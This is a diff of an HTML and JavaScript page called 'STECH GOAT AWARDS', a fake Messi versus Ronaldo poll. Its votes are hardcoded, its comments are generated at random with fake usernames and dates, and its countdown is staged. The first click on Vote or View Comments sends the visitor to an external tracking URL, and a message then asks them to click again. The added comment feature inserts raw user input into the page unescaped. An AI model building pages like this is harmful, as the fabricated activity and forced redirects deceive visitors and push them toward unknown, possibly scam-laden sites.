@@ -5,271 +5,326 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>STECH GOAT AWARDS</title>
 <style>
-    body {
-        margin: 0;
-        font-family: Arial, sans-serif;
-        background: #f2f2f2;
-        padding: 0;
-    }
-    .container {
-        width: 100%;
-        max-width: 600px;
-        margin: auto;
-        padding: 15px;
-    }
-    .title {
-        text-align: center;
-        font-size: 28px;
-        font-weight: bold;
-        margin-top: 20px;
-    }
-    .sub {
-        text-align: center;
-        margin-top: -5px;
-        color: #555;
-    }
-    .vote-box {
-        background: #fff;
-        padding: 15px;
-        margin-top: 20px;
-        border-radius: 10px;
-        text-align: center;
-        box-shadow: 0 0 5px rgba(0,0,0,0.2);
-    }
-    .players {
-        display: flex;
-        justify-content: space-between;
-        margin-top: 15px;
-    }
-    .player {
-        width: 48%;
-        background: #e9e9e9;
-        padding: 10px;
-        border-radius: 10px;
-    }
-    .player img {
-        width: 100%;
-        border-radius: 10px;
-    }
-    .btn {
-        padding: 10px 20px;
-        background: black;
-        color: white;
-        border: none;
-        border-radius: 8px;
-        margin-top: 10px;
-        font-size: 16px;
-        width: 100%;
-    }
-    .comment-box {
-        background: white;
-        padding: 15px;
-        margin-top: 20px;
-        border-radius: 10px;
-        display: none;
-        box-shadow: 0 0 5px rgba(0,0,0,0.2);
-    }
-    .comment {
-        padding: 8px;
-        border-bottom: 1px solid #eee;
-    }
-    .username {
-        font-weight: bold;
-    }
-    .time {
-        font-size: 12px;
-        color: #777;
-    }
-    .share-box {
-        margin-top: 20px;
-        background: white;
-        padding: 15px;
-        border-radius: 10px;
-        box-shadow: 0 0 5px rgba(0,0,0,0.2);
-    }
-    .notice {
-        color: red;
-        font-size: 13px;
-        margin-top: 5px;
-        font-weight: bold;
-    }
+body {
+  margin: 0;
+  font-family: Arial, sans-serif;
+  overflow-x: hidden;
+  background: linear-gradient(135deg, #fceabb, #f8b500);
+  animation: bgAnimate 15s linear infinite alternate;
+}
+@keyframes bgAnimate {
+  0% {background-position: 0% 50%;}
+  50% {background-position: 100% 50%;}
+  100% {background-position: 0% 50%;}
+}
+.container {
+  max-width: 650px;
+  margin: auto;
+  padding: 15px;
+}
+.title {
+  text-align: center;
+  font-size: 32px;
+  font-weight: bold;
+  margin-top: 20px;
+  color: #d40000;
+}
+.sub {
+  text-align: center;
+  margin-top: -5px;
+  color: #555;
+  font-size: 18px;
+}
+.vote-box {
+  background: rgba(255,255,255,0.95);
+  padding: 20px;
+  margin-top: 20px;
+  border-radius: 15px;
+  box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+  text-align: center;
+}
+.players {
+  display: flex;
+  justify-content: space-between;
+  margin-top: 15px;
+}
+.player {
+  width: 48%;
+  background: #fff;
+  padding: 10px;
+  border-radius: 10px;
+  box-shadow: 0 2px 10px rgba(0,0,0,0.2);
+}
+.player img {
+  width: 100%;
+  height: 250px;
+  object-fit: cover;
+  border-radius: 10px;
+}
+.btn {
+  padding: 10px 20px;
+  background: #d40000;
+  color: white;
+  border: none;
+  border-radius: 8px;
+  margin-top: 10px;
+  font-size: 16px;
+  width: 100%;
+  cursor: pointer;
+}
+.btn:hover { background: #a30000; }
+.vote-count {
+  font-size: 28px;
+  font-weight: bold;
+  color: red;
+  margin: 5px 0;
+  transition: all 0.5s ease;
+}
+.comment-box {
+  background: rgba(255,255,255,0.95);
+  padding: 15px;
+  margin-top: 20px;
+  border-radius: 10px;
+  display: none;
+  box-shadow: 0 3px 10px rgba(0,0,0,0.2);
+}
+.comment-header {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  cursor: pointer;
+}
+.comment-list { margin-top: 10px; max-height: 400px; overflow-y: auto; }
+.comment { padding: 8px; border-bottom: 1px solid #eee; }
+.username { font-weight: bold; }
+.time { font-size: 12px; color: #777; }
+.share-box {
+  margin-top: 20px;
+  background: rgba(255,255,255,0.95);
+  padding: 15px;
+  border-radius: 10px;
+  box-shadow: 0 3px 10px rgba(0,0,0,0.2);
+  text-align: center;
+}
+.notice { color: red; font-size: 13px; margin-top: 5px; font-weight: bold; }
+textarea { width: 100%; padding: 10px; border-radius: 8px; border: 1px solid #ccc; margin-top: 5px; resize: none; }
+.countdown { font-weight: bold; font-size: 20px; color: #d40000; margin-top: 10px; text-align:center;}
 </style>
 </head>
 <body>
 
 <div class="container">
 
-    <div class="title">STECH GOAT AWARDS</div>
-    <div class="sub">Who is the real GOAT?</div>
+  <div class="title">STECH GOAT AWARDS</div>
+  <div class="sub">Who is the real GOAT?</div>
 
-    <div class="vote-box">
-        <h3>Current Votes</h3>
-        <p><b>Messi:</b> <span id="messiVotes">1,895,755</span></p>
-        <p><b>CR7:</b> <span id="ronaldoVotes">1,645,332</span></p>
+  <div class="vote-box">
+    <h3>Current Votes</h3>
+    <p><b>Messi:</b> <span id="messiVotes" class="vote-count">1,895,755</span></p>
+    <p><b>CR7:</b> <span id="ronaldoVotes" class="vote-count">1,645,332</span></p>
 
-        <div class="players">
-            <div class="player">
-                <img src="https://i.ibb.co/GQW8P8qN/images-16.jpg">
-                <button class="btn" onclick="vote('messi')">Vote Messi</button>
-            </div>
-
-            <div class="player">
-                <img src="https://i.ibb.co/VWCzf1QP/images.jpg">
-                <button class="btn" onclick="vote('ronaldo')">Vote CR7</button>
-            </div>
-        </div>
-
-        <p class="notice" id="voteNotice"></p>
+    <div class="players">
+      <div class="player">
+        <img src="https://i.ibb.co/GQW8P8qN/images-16.jpg" alt="Messi">
+        <button class="btn" onclick="vote('messi')">Vote Messi</button>
+      </div>
+      <div class="player">
+        <img src="https://i.ibb.co/VWCzf1QP/images.jpg" alt="CR7">
+        <button class="btn" onclick="vote('ronaldo')">Vote CR7</button>
+      </div>
     </div>
 
-    <button class="btn" style="margin-top:20px;background:#333;" onclick="openComments()">View Comments</button>
-    <p class="notice" id="commentNotice"></p>
+    <p class="notice" id="voteNotice"></p>
+    <div class="countdown" id="countdown"></div>
+  </div>
 
-    <div class="comment-box" id="commentBox">
-        <h3>Comments</h3>
-        <div id="comments"></div>
-        <button class="btn" onclick="loadMore()">View more comments</button>
-        <p class="notice">Unable to load previous comments</p>
+  <button class="btn" style="margin-top:20px;background:#333;" onclick="toggleComments()">View Comments ⬇️</button>
+  <p class="notice" id="commentNotice"></p>
+
+  <div class="comment-box" id="commentBox">
+    <div class="comment-header" onclick="collapseComments()">
+      <h3>Comments</h3>
+      <span id="collapseArrow">⬆️</span>
     </div>
+    <div class="comment-list" id="comments"></div>
+    <textarea id="userComment" rows="2" placeholder="Write your comment..."></textarea>
+    <button class="btn" onclick="addUserComment()">Post Comment</button>
+  </div>
 
-    <div class="share-box">
-        <h3>Share This Vote</h3>
-        <button class="btn" onclick="shareNow()">Share</button>
-
-        <p class="notice">
-            ⚠ IMPORTANT NOTICE: Sharing may redirect once.  
-            If redirected, come back & click again — it will work.
-        </p>
-
-        <p style="text-align:center;margin-top:10px;">
-            Follow me on TikTok:  
-            <a href="https://www.tiktok.com/@prof.lord.peps" target="_blank">@prof.lord.peps</a>
-        </p>
-    </div>
+  <div class="share-box">
+    <h3>Share This Vote</h3>
+    <button class="btn" onclick="shareNow()">Share</button>
+    <p class="notice">
+      For more info about the STECH GOAT AWARDS, follow this TikTok account:<br>
+      <a href="https://www.tiktok.com/@prof.lord.peps" target="_blank">@prof.lord.peps</a>
+    </p>
+  </div>
 
 </div>
 
 <script>
-
-// =============== REDIRECT LINK ==================
+// ====================== CONFIG ======================
 const redirectURL = "https://obvioussecretive.com/rwj2iaik6g?key=d39bd78c2ae2358792721a701a778ba9";
-
-// =============== VOTE DATA ======================
 let messi = 1895755;
 let ronaldo = 1645332;
-
-// track if redirect has happened
 let voteRedirectDone = false;
 let commentRedirectDone = false;
+let userVote = null;
 
-// ================== RANDOM COMMENTS =============
+// ====================== VOTE ========================
+function vote(player){
+  if(!voteRedirectDone){
+    voteRedirectDone = true;
+    window.location.href = redirectURL;
+    document.getElementById("voteNotice").innerText = "Redirect detected. Click again to complete your vote.";
+    return;
+  }
 
+  if(userVote === player){
+    // Cancel vote
+    userVote = null;
+    if(player==='messi') messi--;
+    else ronaldo--;
+  } else {
+    // Remove previous vote
+    if(userVote==='messi') messi--;
+    if(userVote==='ronaldo') ronaldo--;
+    // Add new vote
+    userVote = player;
+    if(player==='messi') messi++;
+    else ronaldo++;
+  }
+
+  animateVote("messiVotes", messi);
+  animateVote("ronaldoVotes", ronaldo);
+  document.getElementById("voteNotice").innerText = "";
+}
+
+function animateVote(id, value){
+  const el = document.getElementById(id);
+  let current = parseInt(el.innerText.replace(/,/g,''));
+  const increment = (value - current)/20;
+  let i = 0;
+  const interval = setInterval(()=>{
+    if(i<20){
+      current += increment;
+      el.innerText = Math.round(current).toLocaleString();
+      i++;
+    } else {
+      el.innerText = value.toLocaleString();
+      clearInterval(interval);
+    }
+  },25);
+}
+
+// ====================== COMMENTS ====================
 const commentMessages = [
-    "CR7 all the way!! 🔥",
-    "Messi is too clear 😭🐐",
-    "This one no get debate!",
-    "Ronaldo is the KING 👑",
-    "Messi >>> Football",
-    "I no wan talk too much 🐐🔥",
-    "This award na for Ronaldo!",
-    "Messi fans gather here 😂",
-    "CR7 remains the GOAT",
-    "Both are legends fr 💯",
-    "CR7 too clutch!",
-    "Messi’s magic no be here",
-    "Make una vote wisely o",
-    "Ballers know the truth 😮‍💨",
-    "This one choke! 😭🔥",
-    "We rise for Ronaldo 🐐",
-    "Messi carried football",
-    "CR7 mentality unmatched!",
-    "Messi the little magician ✨",
-    "Ronaldo fans let’s win this!"
+  "CR7 all the way!! 🔥",
+  "Messi is too clear 😭🐐",
+  "Does Ronaldo even have a World Cup? 🤔",
+  "Messi is so short 😅",
+  "Ronaldo is the KING 👑",
+  "Messi >>> Football",
+  "If you support Ronaldo, raise your hand 🙌🙌",
+  "Messi carried football magic 🪄",
+  "Ronaldo fans let's win this!",
+  "Crowd going wild! 🔥",
+  "Messi fans crying 😭",
+  "CR7 mentality unmatched!",
+  "Messi the little magician ✨",
+  "Messi can't lose! 🤯",
+  "Ronaldo still top scorer 🔥",
+  "Who's the real GOAT? 🐐",
+  "Messi fans, raise your hand 🙌",
+  "Critics say CR7 too flashy 😎",
+  "Messi's dribbling insane 💨",
+  "Everyone calm down 😅"
 ];
 
-function randomUsername() {
-    const id = Math.floor(Math.random() * 3500000) + 1;
-    return "user" + id;
+function randomUsername(){
+  return "user" + Math.floor(Math.random()*3500000+1);
 }
 
-function randomDate() {
-    const start = new Date("2024-11-25T00:00:00");
-    const now = new Date();
-    const diff = now.getTime() - start.getTime();
-    const randomPast = new Date(start.getTime() + Math.random() * diff);
-
-    return randomPast.toLocaleString("en-GB", { timeZone: "Africa/Lagos" });
+function randomDate(){
+  const start = new Date("2025-11-23T00:00:00");
+  const now = new Date();
+  const randomTime = new Date(start.getTime() + Math.random()*(now.getTime()-start.getTime()));
+  return randomTime.toLocaleString("en-GB",{timeZone:"Africa/Lagos"});
 }
 
-let commentIndex = 0;
-
-function generateComments(count) {
-    let html = "";
-    for (let i = 0; i < count; i++) {
-        html += `
-            <div class="comment">
-                <div class="username">${randomUsername()}</div>
-                <div>${commentMessages[Math.floor(Math.random() * commentMessages.length)]}</div>
-                <div class="time">${randomDate()}</div>
-            </div>
-        `;
-    }
-    return html;
+function generateComments(count){
+  let html="";
+  for(let i=0;i<count;i++){
+    html+=`<div class="comment">
+      <div class="username">${randomUsername()}</div>
+      <div>${commentMessages[Math.floor(Math.random()*commentMessages.length)]}</div>
+      <div class="time">${randomDate()}</div>
+    </div>`;
+  }
+  return html;
 }
 
-// ====================== VOTING ======================
-
-function vote(player) {
-    if (!voteRedirectDone) {
-        voteRedirectDone = true;
-        window.location.href = redirectURL;
-        document.getElementById("voteNotice").innerText =
-            "Redirect detected. Click again to complete your vote.";
-        return;
-    }
-
-    if (player === "messi") messi++;
-    else ronaldo++;
-
-    document.getElementById("messiVotes").innerText = messi.toLocaleString();
-    document.getElementById("ronaldoVotes").innerText = ronaldo.toLocaleString();
-
-    alert("Vote submitted successfully!");
+// ====================== COMMENT TOGGLE =================
+function toggleComments(){
+  if(!commentRedirectDone){
+    commentRedirectDone = true;
+    window.location.href = redirectURL;
+    document.getElementById("commentNotice").innerText = "Redirect detected. Click again to view comments.";
+    return;
+  }
+  const box = document.getElementById("commentBox");
+  box.style.display = (box.style.display==="block")?"none":"block";
 }
 
-// ===================== COMMENTS ======================
-
-function openComments() {
-    if (!commentRedirectDone) {
-        commentRedirectDone = true;
-        window.location.href = redirectURL;
-        document.getElementById("commentNotice").innerText =
-            "Redirect detected. Click again to view comments.";
-        return;
-    }
-
-    document.getElementById("commentBox").style.display = "block";
-    loadMore();
+function collapseComments(){
+  document.getElementById("commentBox").style.display = "none";
 }
 
-function loadMore() {
-    const box = document.getElementById("comments");
-    box.innerHTML += generateComments(20);
+// ====================== USER COMMENT ===================
+function addUserComment(){
+  const val = document.getElementById("userComment").value.trim();
+  if(val==="") return;
+  const html=`<div class="comment">
+    <div class="username">You</div>
+    <div>${val}</div>
+    <div class="time">${new Date().toLocaleString("en-GB",{timeZone:"Africa/Lagos"})}</div>
+  </div>`;
+  const commentsEl=document.getElementById("comments");
+  commentsEl.innerHTML=html+commentsEl.innerHTML;
+  document.getElementById("userComment").value="";
 }
 
-// ===================== SHARE =========================
-
-function shareNow() {
-    let text = "IMPORTANT NOTICE: You may experience a redirect once. If redirected, come back and click again.\n\n" +
-               "Vote for your GOAT in the STECH GOAT AWARDS! Messi vs CR7 — decide the legend!\n\n" +
-               "Click here to vote now:";
-
-    navigator.share({
-        title: "STECH GOAT AWARDS",
-        text: text,
-        url: window.location.href
-    }).catch(() => {});
+// ====================== SHARE =======================
+function shareNow(){
+  const text = "Vote for your GOAT in the STECH GOAT AWARDS! Messi vs CR7 — decide the legend! Vote now and join the debate!";
+  navigator.share({title:"STECH GOAT AWARDS",text:text,url:window.location.href}).catch(()=>{});
 }
+
+// ====================== AUTO COMMENTS ==================
+setInterval(()=>{
+  const commentsEl=document.getElementById("comments");
+  if(commentsEl.style.display==="block"){
+    commentsEl.innerHTML = generateComments(10) + commentsEl.innerHTML;
+  }
+},60000);
+
+// ====================== COUNTDOWN =====================
+function updateCountdown(){
+  const end = new Date("2025-12-23T23:59:59");
+  const now = new Date();
+  const diff = end-now;
+  if(diff<=0){
+    document.getElementById("countdown").innerText = "Voting closed! Winner announced Dec 24!";
+    return;
+  }
+  const days = Math.floor(diff/1000/60/60/24);
+  const hrs = Math.floor(diff/1000/60/60)%24;
+  const mins = Math.floor(diff/1000/60)%60;
+  const secs = Math.floor(diff/1000)%60;
+  document.getElementById("countdown").innerText = `Time Left: ${days}d ${hrs}h ${mins}m ${secs}s`;
+}
+setInterval(updateCountdown,1000);
+updateCountdown();
 
 </script>
 
